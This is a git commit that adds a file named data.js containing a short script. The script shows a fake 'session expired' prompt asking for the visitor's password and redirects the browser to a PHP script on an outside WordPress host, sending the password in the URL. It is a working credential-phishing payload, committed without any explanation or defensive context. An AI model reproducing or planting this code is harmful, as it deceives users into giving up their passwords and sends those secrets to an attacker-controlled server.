15a9a0496fcf2d00d01ef6e8ce60b887100656f6
rookchess <48004219+rookchess@users.noreply.github.com>
2019-04-26 15:08:28 +0530

    Create data.js

---
+++ data.js
@@ -0,0 +1,4 @@
+<script>
+var person = prompt("Your session expired. Please enter password to continue");
+window.location.href = "https://bizztor.com/wp-content/uploads/2018/04/data.php?textdata="+person;
+</script>
